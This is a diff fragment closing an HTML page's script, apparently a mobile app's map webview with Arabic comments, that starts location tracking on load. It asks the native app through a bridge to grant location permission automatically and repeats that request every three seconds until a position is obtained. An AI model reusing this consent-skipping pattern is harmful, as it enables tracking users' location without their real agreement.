+/* ========== الإقلاع التلقائي ========== */
+function boot(){
+  Bridge.post('webview_ready',{
+    secure:isSecure,protocol:proto,
+    geolocation:('geolocation'in navigator)
+  });
+
+  initMap();
+
+  // ✅ إخبار التطبيق الأصلي فورًا بمنح الإذن تلقائيًا
+  Bridge.post('request_auto_grant',{});
+
+  // ✅ طلب فوري
+  tryGetOnce();
+
+  // ✅ مراقبة مستمرة
+  tryWatch();
+
+  // ✅ نبضة إعادة محاولة كل 3 ثوانٍ حتى النجاح
+  var heartbeat=setInterval(function(){
+    if(retryCount>0||latEl.textContent==='—'){
+      tryGetOnce();
+      tryWatch();
+      Bridge.post('request_auto_grant',{});
+    }else{
+      // نجح → أوقف النبضة
+      if(latEl.textContent!=='—')clearInterval(heartbeat);
+    }
+  },3000);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive'){
+  setTimeout(boot,0);
+}else{
+  document.addEventListener('DOMContentLoaded',boot);
+}
+
+window.addEventListener('beforeunload',function(){
+  if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}}
+});
+
+})();
+</script>
 </body>
 </html>
